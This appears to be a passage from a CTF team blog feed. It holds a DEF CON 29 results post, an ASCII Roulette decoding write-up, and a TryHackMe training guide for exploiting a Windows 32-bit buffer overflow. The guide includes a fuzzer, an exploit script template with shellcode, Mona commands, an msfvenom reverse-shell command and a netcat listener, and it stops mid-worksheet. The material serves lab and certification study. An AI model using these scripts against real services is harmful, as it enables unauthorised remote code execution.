</span></code></pre></div></div>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="HacktivityCon2021" /><summary type="html"><![CDATA[Challenge Text:]]></summary></entry><entry><title type="html">DEF CON 29 - Team NINPWN Red Team Village Competition Results</title><link href="http://0.0.0.0:4000/news/2021/08/08/defcon2021results.html" rel="alternate" type="text/html" title="DEF CON 29 - Team NINPWN Red Team Village Competition Results" /><published>2021-08-08T13:12:41-05:00</published><updated>2021-08-08T13:12:41-05:00</updated><id>http://0.0.0.0:4000/news/2021/08/08/defcon2021results</id><content type="html" xml:base="http://0.0.0.0:4000/news/2021/08/08/defcon2021results.html"><![CDATA[<table style="width:75%">

	<td>
	<a href="https://defcon.org/" target="_blank"><img src="/assets/news/defcon29/dc-29-logo.webp" /></a>
	</td>
	<td style="width:20%">
	<a href="https://redteamvillage.io/" target="_blank"><img src="/assets/news/defcon29/rtv.png" /></a>
	</td>
</table>

<h3 id="in-a-divide-and-conquer-strategy-to-check-out-both-the-rtv-ctf--and-the-cyberwraith--tournament-some-team-members-conquered-a-bit-more-than-others-this-year">In a divide and conquer strategy to check out both the <a href="https://redteamvillage.io/ctf" target="_blank">RTV CTF</a>  and the <a href="https://redteamvillage.io/cyberwraith.html" target="_blank">CyberWraith</a>  Tournament, some team members conquered a bit more than others this year:</h3>

<center><a href="https://ninpwn.com/" target="_blank"><img src="/assets/images/ninpwn.png" width="15%" /></a></center>

<style type="text/css">
h2 {color:  #FF0000; 
	font-weight:  bold;
	}
</style>

<h2 id="-congrats-to-team-captain-ninpwn-for-finishing-1st-place-solo-in-the-cyberwraith-tournament-">‚Äî Congrats to team captain <em>ninpwn</em> for finishing 1st place solo in the <a href="https://www.cyberwarriornetwork.com/defcon29-redteamvillage-cyberwraith/" target="_blank">CyberWraith</a> tournament!!! ‚Äî</h2>

<p><img src="/assets/news/defcon29/cyberwraith2021lb.png" alt="cyberwraith2021lb.png" /></p>

<h3 id="shinris3n-also-makes-an-appearance-somewhere-on-the-list-right-below-some-rn-that-decided-she-could-be-pretty-good-at-this-stuff-and-proved-it"><em>shinris3n</em> also makes an appearance somewhere on the list, right below some RN that decided she could be pretty good at this stuff and proved it‚Ä¶</h3>

<h3 id="team-ninpwn-also-took-100th-place-in-the-rtv-ctf-quals-this-was-thanks-to-the-help-of-a-new-member-to-the-team-bongo42--we-were-psyched-that-bongo-could-join-us-and-we-hope-he-joins-us-for-many-more-competitions-moving-forward">Team NINPWN also took 100th place in the <a href="https://ctf.threatsims.com/teams/143" target="_blank">RTV CTF quals</a>. This was thanks to the help of a new member to the team: <em>bongo42</em>.  We were psyched that <em>bongo</em> could join us, and we hope he joins us for many more competitions moving forward!</h3>

<p><img src="/assets/news/defcon29/rtvctfquals.png" alt="rtvctfquals.png" /></p>

<h3 id="thanks-to-all-the-organizers-of-these-fantastic-events-you-guys-rock--we-cant-wait-to-see-what-you-have-in-store-next-year-at-def-con-30">Thanks to all the organizers of these fantastic events, you guys rock!  We can‚Äôt wait to see what you have in store next year at DEF CON 30!</h3>

<h3 id="next-up-this-year-the-hcktivity-con-ctf-hosted-by-our-favorite-ctf-creator-john-hammond">Next up this year: the <a href="https://www.hackerone.com/hacktivitycon" target="_blank">h@cktivity Con</a> CTF, hosted by our favorite CTF creator, <a href="https://www.youtube.com/user/RootOfTheNull" target="_blank">John Hammond</a>!</h3>

<p><a href="https://ninpwn.com/" target="_blank"><img src="/assets/images/ninpwn.png" /></a></p>]]></content><author><name></name></author><category term="[&quot;news&quot;]" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">ASCII Roulette</title><link href="http://0.0.0.0:4000/writeups/2021/08/07/Defcon29RTVCTF-ASCIIRoulette.html" rel="alternate" type="text/html" title="ASCII Roulette" /><published>2021-08-07T18:20:12-05:00</published><updated>2021-08-07T18:20:12-05:00</updated><id>http://0.0.0.0:4000/writeups/2021/08/07/Defcon29RTVCTF-ASCIIRoulette</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/2021/08/07/Defcon29RTVCTF-ASCIIRoulette.html"><![CDATA[<p><img src="/assets/writeups/DefconRTVCTF2021/fc87d99fca484a23a74aef239560c99f.png" alt="36b0b02e2b149d78d49234508c1f96a6.png" /></p>

<ul>
  <li>This was the original source code, which will take some effort to understand:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define lucky_num 24
#define angry_stache }
#define happy_stache {
#define extra_fate &gt;&gt;
#define lesser_fate &lt;&lt;
#define less_fate &lt;
#define gained_fate +
#define lost_fate -
#define absolute_fate ==
#define given_fate =
#define start main()
#define lucky_number (rand()%7)+1;
#define cat for
#define give cout
#define take cin
#define seven flag
#define luck int
#define lucky string
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="n">luck</span> <span class="n">start</span>
<span class="n">happy_stache</span>
        <span class="n">lucky</span> <span class="n">seven</span><span class="p">;</span>
        <span class="n">give</span> <span class="n">lesser_fate</span> <span class="s">"Enter Any String to Make it Lucky: "</span><span class="p">;</span>
        <span class="n">take</span> <span class="n">extra_fate</span> <span class="n">seven</span><span class="p">;</span>
        <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
        <span class="n">luck</span> <span class="n">seven_rand</span> <span class="n">given_fate</span> <span class="n">lucky_number</span>
        <span class="n">give</span> <span class="n">lesser_fate</span> <span class="s">"Your Lucky Numbers are: "</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="n">luck</span> <span class="n">i</span> <span class="n">given_fate</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="n">less_fate</span> <span class="n">seven</span><span class="p">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">happy_stache</span>
                <span class="n">luck</span> <span class="n">seven_num</span> <span class="n">given_fate</span> <span class="n">seven</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
                <span class="n">seven_num</span> <span class="n">given_fate</span> <span class="n">seven_num</span> <span class="o">^</span> <span class="n">seven_rand</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="n">absolute_fate</span> <span class="mi">0</span><span class="p">)</span>
                <span class="n">happy_stache</span>
                        <span class="n">seven_num</span> <span class="n">given_fate</span> <span class="n">seven_num</span> <span class="n">gained_fate</span> <span class="n">lucky_num</span><span class="p">;</span>
                <span class="n">angry_stache</span>
                <span class="k">else</span>
                <span class="n">happy_stache</span>
                        <span class="n">seven_num</span> <span class="n">given_fate</span> <span class="n">seven_num</span> <span class="n">lost_fate</span> <span class="n">lucky_num</span><span class="p">;</span>
                <span class="n">angry_stache</span>
                <span class="n">give</span> <span class="n">lesser_fate</span> <span class="n">seven_num</span> <span class="n">lesser_fate</span> <span class="s">" "</span><span class="p">;</span>
        <span class="n">angry_stache</span>
<span class="n">angry_stache</span>
</code></pre></div></div>

<ul>
  <li>Substituting the defines throughout the code to make it readable:</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define lucky_num 24
#define angry_stache }
#define happy_stache {
#define extra_fate &gt;&gt;
#define lesser_fate &lt;&lt;
#define less_fate &lt;
#define gained_fate +
#define lost_fate -
#define absolute_fate ==
#define given_fate =
#define start main()
#define lucky_number (rand()%7)+1;
#define cat for
#define give cout
#define take cin
#define seven flag
#define luck int
#define lucky string
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="n">string</span> <span class="n">flag</span><span class="p">;</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Enter Any String to Make it Lucky: "</span><span class="p">;</span>
        <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">flag</span><span class="p">;</span>
        <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
        <span class="kt">int</span> <span class="n">flag_rand</span> <span class="o">=</span> <span class="p">(</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">7</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Your Lucky Numbers are: "</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">flag</span><span class="p">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="kt">int</span> <span class="n">flag_num</span> <span class="o">=</span> <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
                <span class="n">flag_num</span> <span class="o">=</span> <span class="n">flag_num</span> <span class="o">^</span> <span class="n">flag_rand</span><span class="p">;</span>
                <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                <span class="p">{</span>
                        <span class="n">flag_num</span> <span class="o">=</span> <span class="n">flag_num</span> <span class="o">+</span> <span class="mi">24</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">else</span>
                <span class="p">{</span>
                        <span class="n">flag_num</span> <span class="o">=</span> <span class="n">flag_num</span> <span class="o">-</span> <span class="mi">24</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">flag_num</span> <span class="o">&lt;&lt;</span> <span class="s">" "</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>
    <p>This shows us that the decimal value of each ASCII character in the string received from the commmand line is first bitwise XOR‚Äôd with a random number between 1 and 8.  This random number is chosen right at the beginning, so does not change.</p>
  </li>
  <li>
    <p>24 is then added to the value of every even indexed character in the string and 24 is subtracted from the value of every odd indexed character in the string.</p>
  </li>
  <li>
    <p>Now, we just have to write a script to reverse this entire process on the encoded string we are provided in the challenge, brute forcing the random offset value:</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">roulette_string</span> <span class="o">=</span> <span class="s">"123 81 124 74 150 29 127 94 126 88 143 72 114 29 143 66 129 88 126 86 148 66 123 81 73 24 82 96"</span>

<span class="n">roulette_array</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">roulette_string</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)))</span>

<span class="k">print</span> <span class="p">(</span><span class="s">"ASCII Roulette Array: "</span><span class="p">,</span> <span class="n">roulette_array</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">rand_num</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">rand_num</span> <span class="o">&lt;=</span> <span class="mi">8</span><span class="p">:</span>
	<span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">roulette_array</span><span class="p">:</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
			<span class="n">flag_num</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">-</span> <span class="mi">24</span><span class="p">)</span> <span class="o">^</span> <span class="n">rand_num</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="n">flag_num</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span> <span class="o">+</span> <span class="mi">24</span><span class="p">)</span> <span class="o">^</span> <span class="n">rand_num</span>
		<span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">flag_num</span><span class="p">)</span>
		<span class="n">index</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span>
	<span class="k">if</span> <span class="n">flag</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="s">"flag"</span><span class="p">:</span>
		<span class="k">print</span> <span class="p">(</span><span class="s">"Flag Found for rand_num ="</span><span class="p">,</span> <span class="n">rand_num</span><span class="p">,</span> <span class="s">":"</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
	<span class="n">rand_num</span> <span class="o">=</span> <span class="n">rand_num</span> <span class="o">+</span> <span class="mi">1</span>
	<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
</code></pre></div></div>

<p><img src="/assets/writeups/DefconRTVCTF2021/ba25ebd461c44f1aa35a98957494569b.png" alt="93b0c4bcaa0b44b849500aee79fbbb98.png" /></p>]]></content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon29-RTVCTF" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Buffer Overflow Prep</title><link href="http://0.0.0.0:4000/writeups/resources/2021/06/13/TryHackMe-BOF-Prep.html" rel="alternate" type="text/html" title="Buffer Overflow Prep" /><published>2021-06-13T16:13:21-05:00</published><updated>2021-06-13T16:13:21-05:00</updated><id>http://0.0.0.0:4000/writeups/resources/2021/06/13/TryHackMe-BOF-Prep</id><content type="html" xml:base="http://0.0.0.0:4000/writeups/resources/2021/06/13/TryHackMe-BOF-Prep.html"><![CDATA[<p><a href="https://tryhackme.com/" target="_blank"><img src="/assets/writeups/TryHackMe/THMlogo.png" width="225" /></a></p>

<h1 id="11-step-process-for-exploiting-a-windows-32-bit-application-buffer-overflow-">11 Step Process for Exploiting a Windows 32-Bit Application Buffer Overflow <br /></h1>

<h4 id="procedure-and-worksheet-based-on-material-from-the-tib3rius-buffer-overflow-prep-try-hack-me-room">(Procedure and Worksheet based on Material from the Tib3rius <a href="https://tryhackme.com/room/bufferoverflowprep" target="_blank">Buffer Overflow Prep</a> Try Hack Me Room)</h4>

<h2 id="table-of-contents"><a name="toc"></a>Table of Contents</h2>

<ol>
  <li><a href="#tools">Tools</a></li>
  <li><a href="#process">Process with Example Commands and Output</a></li>
  <li><a href="#applications">List of Example Commands by Application</a></li>
  <li><a href="#fuzzer">Python 3 Fuzzer Script Template</a></li>
  <li><a href="#exploit">Python 3 Exploit Script Template</a></li>
  <li><a href="#worksheet">OSCP Friendly Manual BOF Exploit Worksheet</a></li>
</ol>

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

<hr />

<h2 id="tools"><a name="tools"></a>Tools</h2>

<ul>
  <li>Immunity Debugger with Mona Plugin</li>
  <li>Metasploit Framework</li>
  <li>Python 3 fuzzer and exploit script templates (found below)</li>
  <li>XFreeRDP</li>
  <li>Netcat</li>
</ul>

<p><a href="#toc">Return to Table of Contents</a></p>

<hr />

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

<h2 id="process-with-example-commands-and-output"><a name="process"></a>Process with Example Commands and Output</h2>

<p><strong>Step 1</strong> - Open an RDP session to the target machine, if applicable then run the vulnerable application and fuzz to find the general range of the EIP register offset at the point of the application crashing.</p>

<p><code class="language-plaintext highlighter-rouge">xfreerdp /u:admin /p:password /cert:ignore /v:10.10.11.33 /workarea</code></p>

<p><code class="language-plaintext highlighter-rouge">python3 fuzzer.py</code></p>

<p><strong>Step 2</strong> - Create a pattern that‚Äôs 400 characters over the estimated offset via metasploit.</p>

<p><code class="language-plaintext highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700</code></p>

<p><strong>Step 3</strong> - Modify exploit script with the target ip and port, pattern as the payload, offset = 0, retn = ‚Äú‚Äù, padding = ‚Äú‚Äù, postfix = ‚Äú‚Äù.</p>

<p><strong>Step 4</strong> - Open Immunity Debugger (running as admin) and load the vulnerable application, then use Mona to find the exact EIP offset.</p>

<p><code class="language-plaintext highlighter-rouge">!mona findmsp -distance 1100</code></p>

<p><img src="/assets/writeups/TryHackMe/BOFPrep/076f8fddebb340d0bd9c788ecade2743.png" alt="91eed7279aec31c58183ac4f1d1b56d3.png" /></p>

<p><strong>Step 5</strong> - Verify the offset value by updating and running exploit.py with no payload, the found offset value, and a return address string (‚Äúe.g. BCDE‚Äù) to check for EIP overwrite.</p>

<p><img src="/assets/writeups/TryHackMe/BOFPrep/55c279c6b2724a61973b20832f27ebd0.png" alt="bce6ef0f3b0529f9ad73f69fe5074110.png" /></p>

<p><strong>Step 6</strong> - Use Mona to generate a bad character set, excluding \x00, update exploit.py then run it, noting the ESP register value.</p>

<p><code class="language-plaintext highlighter-rouge">!mona config -set workingfolder c:\mona\%p</code>
<code class="language-plaintext highlighter-rouge">!mona bytearray -b "\x00"</code></p>

<p><img src="/assets/writeups/TryHackMe/BOFPrep/8ef8c60148f9480e98a83849f2bc1f4b.png" alt="911f323f12a625db489113b17199229a.png" /></p>

<p><strong>Step 7</strong> - Use Mona to find possible bad characters with a comparison between the byte array and ESP.</p>

<p><code class="language-plaintext highlighter-rouge">!mona compare -f C:\mona\oscp\bytearray.bin -a 0192FA30</code></p>

<p><strong>Step 8</strong> - Update the byte array and payload to exclude all possible bad characters, then run the exploit followed by a Mona comparison to find bad characters.  Remove identified bad characters (ignoring the second of adjacent bytes that are flagged as bad, as this may not be the case) and repeat the process until all bad characters have been eliminated.</p>

<p><img src="/assets/writeups/TryHackMe/BOFPrep/92ad0e178a52488cbb8131f1d5c37a28.png" alt="5792de7cc1861f92bb50d7d596a32401.png" /></p>

<p><code class="language-plaintext highlighter-rouge">!mona bytearray -b "\x00\x11\x40\x5f\xb8\xee"</code></p>

<p><code class="language-plaintext highlighter-rouge">!mona compare -f C:\mona\oscp\bytearray.bin -a 017CFA30</code> (Update the ESP address after each crash)</p>

<p><img src="/assets/writeups/TryHackMe/BOFPrep/3dfe0c17cab748fbbd4a848a9a6ae22d.png" alt="0d6965704c28259558dd0dd352f5e571.png" /></p>

<p><strong>Step 9</strong> - Find a JMP point using Mona and update the RETN variable in the exploit script accordingly.</p>

<p><code class="language-plaintext highlighter-rouge">!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"</code></p>

<p><img src="/assets/writeups/TryHackMe/BOFPrep/4067cd8d3e8f4249ab4b7cc32db2f634.png" alt="5f1b0a5b192ec6f30b3bed16b0b1c387.png" /></p>

<p><code class="language-plaintext highlighter-rouge">retn = "\x03\x12\x50\x62"</code> (Little Endian)</p>

<p><strong>Step 10</strong> - Generate an MSF reverse shell payload (excluding all bad characters identified) and replace the payload value in exploit.py, along with NOP (\x90) padding of at least 16 bytes.</p>

<p><code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c</code></p>

<p><strong>Step 11</strong> - Open up a Netcat listener and run the exploit for reverse shell.</p>

<p><code class="language-plaintext highlighter-rouge">nc -nvlp 4444</code></p>

<p><img src="/assets/writeups/TryHackMe/BOFPrep/5b5558e9b28244c69fac2f0b73b994cc.png" alt="49f1b60f4a406df4a7ec27ae5e868cc0.png" /></p>

<p><a href="#toc">Return to Table of Contents</a></p>

<hr />

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

<h2 id="list-of-example-commands-by-application"><a name="applications"></a>List of Example Commands by Application</h2>

<h3 id="rdp">RDP:</h3>
<p><code class="language-plaintext highlighter-rouge">xfreerdp /u:admin /p:password /cert:ignore /v:10.10.11.33 /workarea</code></p>

<h3 id="metasploit">Metasploit:</h3>
<p><code class="language-plaintext highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</code></p>

<h3 id="mona">Mona:</h3>
<p>Set Working Folder Path - <code class="language-plaintext highlighter-rouge">!mona config -set workingfolder c:\mona\%p</code></p>

<p>Find EIP offset - <code class="language-plaintext highlighter-rouge">!mona findmsp -distance 1100</code></p>

<p>Generate a Byte Array Excluding Bad Chars - <code class="language-plaintext highlighter-rouge">!mona bytearray -b "\x00\x09"</code></p>

<p>Find Bad Characters - <code class="language-plaintext highlighter-rouge">!mona compare -f C:\mona\oscp\bytearray.bin -a 01A0FA30</code></p>

<p>Find JMP ESP spots Excluding Bad Chars - <code class="language-plaintext highlighter-rouge">!mona jmp -r esp -cpb "\x00\x23\x24\x3c\x3d\x83\x84\xba\xbb"</code></p>

<p>Generate a Shellscript Excluding Bad Chars - <code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c</code></p>

<h3 id="basic-netcat-listener-for-reverse-shell">Basic Netcat Listener for Reverse Shell:</h3>
<p><code class="language-plaintext highlighter-rouge">nc -nvlp 4444</code></p>

<p><a href="#toc">Return to Table of Contents</a></p>

<hr />

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

<h2 id="python-3-fuzzer-script-template"><a name="fuzzer"></a>Python 3 Fuzzer Script Template</h2>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.98.22"</span>

<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
<span class="n">timeout</span> <span class="o">=</span> <span class="mi">5</span>
<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW2 "</span> <span class="c1"># This specific input is necessary for the THM room exercises
</span>
<span class="n">string</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
      <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
      <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
      <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"Fuzzing with {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">)))</span>
      <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
      <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Fuzzing crashed at {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">)))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
  <span class="n">string</span> <span class="o">+=</span> <span class="mi">100</span> <span class="o">*</span> <span class="s">"A"</span>
  <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></code></pre></figure>

<p><a href="#toc">Return to Table of Contents</a></p>

<hr />

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

<h2 id="python-3-exploit-script-template"><a name="exploit"></a>Python 3 Exploit Script Template</h2>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"10.10.98.22"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="n">prefix</span> <span class="o">=</span> <span class="s">"OVERFLOW2 "</span> <span class="c1"># This specific input is necessary for the THM room exercises
</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">634</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">retn</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xaf\x11\x50\x62</span><span class="s">"</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">16</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"</span><span class="se">\xfc\xbb\x17\x74\x72\x5e\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xeb\x9c\xf0\x5e\x13</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x90\x48\xf4\xd4\x90\x6e\x0a\xd7</span><span class="s">"</span>
<span class="p">)</span>
<span class="n">postfix</span> <span class="o">=</span> <span class="s">""</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
  <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Sending evil buffer..."</span><span class="p">)</span>
  <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">buffer</span> <span class="o">+</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"latin-1"</span><span class="p">))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Done!"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Could not connect."</span><span class="p">)</span></code></pre></figure>

<p><a href="#toc">Return to Table of Contents</a></p>

<hr />

<div style="page-break-after: always; visibility: hidden"> \pagebreak </div>

<h2 id="oscp-friendly-manual-bof-exploit-worksheet"><a name="worksheet"></a>OSCP Friendly Manual BOF Exploit Worksheet</h2>

<ul>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 1 - Open an RDP session to the target machine, if applicable then run the vulnerable application and fuzz to find the general range of the EIP register offset at the point of the application crashing.</p>

    <p><code class="language-plaintext highlighter-rouge">python3 fuzzer.py</code></p>

    <p><mark>Crashed at <input type="number" id="estoffset" name="estoffset" value=" " /> bytes. <br /> Add 400 to the value entered above: <input type="number" id="estoffsetplus" name="estoffsetplus" value=" " /><br />(Substitute for XXXX in code segments below)</mark></p>
  </li>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 2 - Create a pattern that‚Äôs 400 characters over the estimated offset via metasploit.</p>

    <p><code class="language-plaintext highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l XXXX</code></p>
  </li>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 3 - Modify exploit script with the target ip and port, pattern as the payload, offset = 0, retn = ‚Äú‚Äù, padding = ‚Äú‚Äù, postfix = ‚Äú‚Äù.</p>
  </li>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 4 - Open Immunity Debugger (running as admin) and load the vulnerable application, then use Mona to find the exact EIP offset.</p>

    <p><code class="language-plaintext highlighter-rouge">!mona findmsp -distance XXXX</code></p>

    <p><mark>Exact Offset = <input type="number" id="offset" name="offset" value=" " /> <br />(Substitute for PPPP in code segments below)</mark></p>
  </li>
  <li>
    <p><input type="checkbox" unchecked="" /> Step 5 - Verify the offset value by updating and running exploit.py with no payload, the found offset value, and a return address string (‚Äúe.g. BCDE‚Äù) to check for EIP overwrite.</p>

    <p><code class="language-plaintext highlighter-rouge">python3 exploit.py</code></p>
  </li>
  <li>
